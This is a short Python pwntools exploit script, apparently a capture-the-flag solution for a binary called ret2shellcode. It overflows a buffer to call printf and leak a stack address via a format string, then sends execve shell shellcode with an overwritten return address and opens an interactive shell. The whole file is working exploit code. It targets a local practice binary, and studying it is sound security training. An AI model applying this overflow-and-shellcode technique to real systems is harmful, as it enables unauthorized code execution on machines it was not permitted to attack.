from pwn import *
context.arch="i386"
p = process("./ret2shellcode")
buf2 = p.elf.sym['buf2']     

printf = p.elf.plt['printf']
main = p.elf.sym['main']
payload1 = b"%2$p"
payload1 = payload1.ljust(0x70, b"\x00")
p.sendline(payload1 + p32(printf)+p32(main) + p32(buf2))

p.recvuntil(b"bye bye ~")
leak = int(p.recvuntil(b"No system for",drop=True), 16)
shellcode_ptr = leak - 0x88

payload2 = asm(shellcraft.sh())
payload2 = payload2.ljust(0x68, b"\x00")

p.sendline(payload2 + p32(shellcode_ptr))
p.clean()
p.interactive()